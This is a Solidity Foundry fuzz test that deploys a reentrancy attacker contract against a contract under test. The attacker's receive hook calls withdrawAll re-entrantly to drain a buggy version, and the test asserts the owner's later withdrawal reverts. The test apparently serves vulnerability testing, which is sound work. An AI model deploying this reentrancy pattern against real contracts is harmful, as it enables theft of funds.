import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    address owner = address(0xbeef);

    function setUp() public {
        vm.prank(owner);
        c = new C();
    }
    function testFuzz_property(uint256 amount, uint256 reentrantAmount) public {
        // 1. restrict amounts to admissible range: nonzero and within funded bounds
        vm.assume(amount > 0 && reentrantAmount > 0);
        vm.assume(amount <= 1000 ether && reentrantAmount <= 1000 ether);

        // 2. deploy adversarial re-entrant attacker that calls withdrawAll from receive
        ReentrantAttacker attacker = new ReentrantAttacker(c);

        // fund the contract via fallback from owner
        vm.deal(owner, amount);
        vm.prank(owner);
        (bool ok,) = address(c).call{value: amount}("");
        require(ok, "owner funding failed");

        // fund the attacker
        vm.deal(address(attacker), reentrantAmount);

        // attacker triggers its attack: sends Ether to C's fallback, which triggers receive -> withdrawAll
        attacker.attack{value: reentrantAmount}();

        // 3. after attack, the owner should be UNABLE to withdrawAll (reverts) despite being owner
        vm.deal(owner, 0); // clean balance for clarity
        vm.prank(owner);
        bool ownerWithdrawSucceeded;
        try c.withdrawAll() {
            ownerWithdrawSucceeded = true;
        } catch {
            ownerWithdrawSucceeded = false;
        }

        // Property: owner's withdrawAll must revert after re-entrant drain
        assertTrue(!ownerWithdrawSucceeded, "Owner withdrawAll should revert after re-entrant drain");
    }
}

contract ReentrantAttacker {
    C public target;
    bool private attacking;

    constructor(C _target) {
        target = _target;
    }

    function attack() external payable {
        require(msg.value > 0, "need ether");
        attacking = true;
        // send ETH to C to trigger fallback -> depositsCount++ -> receive hook
        (bool ok,) = address(target).call{value: msg.value}("");
        require(ok, "attack call failed");
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            // re-entrantly call withdrawAll; in buggy version this drains the contract
            target.withdrawAll();
        }
    }
}

